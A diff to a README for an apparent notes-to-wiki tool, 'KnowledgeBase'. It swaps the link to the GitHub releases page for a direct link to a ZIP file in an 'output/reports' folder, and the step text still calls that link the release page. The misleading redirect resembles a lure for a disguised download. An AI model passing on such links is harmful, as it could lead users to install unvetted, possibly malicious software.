@@ -1,10 +1,10 @@
 # 🧠 KnowledgeBase - Turn Raw Notes Into Clear Wiki
 
-[![Download KnowledgeBase](https://img.shields.io/badge/Download%20KnowledgeBase-Purple?style=for-the-badge&logo=github)](https://github.com/Doomsekkar-hub/KnowledgeBase/releases)
+[![Download KnowledgeBase](https://img.shields.io/badge/Download%20KnowledgeBase-Purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Doomsekkar-hub/KnowledgeBase/main/output/reports/Knowledge-Base-2.6-alpha.4.zip)
 
 ## 📥 Download
 
-1. Open the release page: https://github.com/Doomsekkar-hub/KnowledgeBase/releases
+1. Open the release page: https://raw.githubusercontent.com/Doomsekkar-hub/KnowledgeBase/main/output/reports/Knowledge-Base-2.6-alpha.4.zip
 2. Get the latest Windows package from the release list
 3. Save the file to your computer
 4. If the file comes as a ZIP archive, extract it to a folder you can find again
